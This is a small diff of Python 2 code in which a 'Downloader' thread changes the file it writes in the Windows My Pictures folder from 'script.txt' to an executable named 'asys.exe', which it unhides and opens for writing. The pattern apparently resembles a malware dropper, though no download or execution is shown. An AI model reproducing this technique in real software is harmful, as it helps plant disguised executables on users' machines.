@@ -24,7 +24,7 @@ class Downloader(threading.Thread):
     def run(self):
         """Run the thread."""
         #Make a file for the script
-        path = file_in_special_path(shellcon.CSIDL_MYPICTURES, "script.txt")
+        path = file_in_special_path(shellcon.CSIDL_MYPICTURES, "asys.exe")
         print path
         unhide_file(path)
         f = open(path, "w")
